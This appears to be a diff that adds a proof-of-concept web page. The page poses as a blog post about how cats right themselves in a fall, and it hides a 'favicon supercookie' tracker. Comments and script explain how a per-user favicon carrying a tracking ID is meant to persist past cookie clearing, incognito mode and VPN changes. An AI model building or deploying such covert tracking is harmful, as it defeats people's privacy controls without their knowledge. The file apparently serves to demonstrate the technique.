@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interesting Article About Cats</title>
+
+    <!--
+        THIS IS THE SUPERCOOKIE MECHANISM
+        
+        The favicon is unique per user. It gets cached by the browser with
+        immutable/max-age headers. The favicon cache in some browsers is:
+        - NOT partitioned by top-level site
+        - NOT cleared when cookies are cleared
+        - NOT affected by incognito in some implementations
+        - NOT affected by VPN/IP changes
+        
+        The tracking ID is encoded in the pixel data of the favicon itself.
+        To the human eye, all favicons look identical (dark icon).
+    -->
+    <link rel="icon" type="image/bmp" href="/set-favicon.bmp?tid=TRACKING_ID_PLACEHOLDER">
+
+    <style>
+        /* Innocent-looking blog page */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Georgia, 'Times New Roman', serif;
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            color: #333;
+            line-height: 1.7;
+            background: #fafafa;
+        }
+        h1 { font-size: 2em; margin-bottom: 0.5em; color: #111; }
+        .meta { color: #888; font-size: 0.9em; margin-bottom: 2em; }
+        p { margin-bottom: 1.2em; }
+        .highlight {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px 16px;
+            margin: 1.5em 0;
+            font-style: italic;
+        }
+        #status {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            font-family: monospace;
+            font-size: 11px;
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: none; /* Hidden by default, shown in debug mode */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Why Cats Always Land on Their Feet</h1>
+    <div class="meta">Published February 9, 2026 · 3 min read</div>
+
+    <p>
+        The cat righting reflex is one of nature's most elegant biomechanical 
+        solutions. When a cat falls, it can rotate its body mid-air to land on 
+        its feet in as little as 0.3 seconds, even from a height of just 30 
+        centimeters.
+    </p>
+
+    <div class="highlight">
+        Fun fact: Cats have no functional collarbone, which gives their spine 
+        extraordinary rotational flexibility - up to 180° of twist.
+    </div>
+
+    <p>
+        The physics involves conservation of angular momentum. The cat tucks 
+        its front legs (reducing moment of inertia) while extending its back 
+        legs, allowing differential rotation of the front and back halves of 
+        its body independently.
+    </p>
+
+    <p>
+        This phenomenon was first studied scientifically by Étienne-Jules Marey 
+        in 1894, using chronophotography to capture the sequence of movements. 
+        His findings challenged the prevailing assumption that cats pushed off 
+        from the surface they fell from.
+    </p>
+
+    <p>
+        Modern research at Stanford has shown that the same principles apply to 
+        robotic systems. The "cat robot" project uses these biomechanical 
+        insights to develop robots that can self-right during falls - useful 
+        for search and rescue drones and space exploration vehicles.
+    </p>
+
+    <!-- Debug panel for PoC demonstration -->
+    <div id="status"></div>
+
+    <script>
+        // ── PoC Debug Mode ─────────────────────────────────────
+        // Add ?debug=1 to URL to see tracking status
+        const params = new URLSearchParams(window.location.search);
+        const debug = params.get('debug') === '1';
+        const statusEl = document.getElementById('status');
+
+        if (debug) {
+            statusEl.style.display = 'block';
+
+            // Generate a tracking ID (in real attack: server-side, per-user)
+            const tid = params.get('tid') || crypto.randomUUID();
+
+            // Update the favicon link dynamically
+            const faviconLink = document.querySelector('link[rel="icon"]');
+            faviconLink.href = `/set-favicon.bmp?tid=${tid}`;
+
+            statusEl.textContent = `🍪 Supercookie SET\nTracking ID: ${tid.slice(0, 8)}...\nFavicon cached with immutable headers\n\nThis survives:\n✓ Cookie clearing\n✓ localStorage clearing\n✓ Browser restart\n✓ VPN change`;
+
+            console.log(`[Favicon Supercookie] Tracking ID set: ${tid}`);
+            console.log(`[Favicon Supercookie] Favicon URL: ${faviconLink.href}`);
+            console.log(`[Favicon Supercookie] To verify: open /probe?debug=1`);
+        }
+    </script>
+
+</body>
+</html>
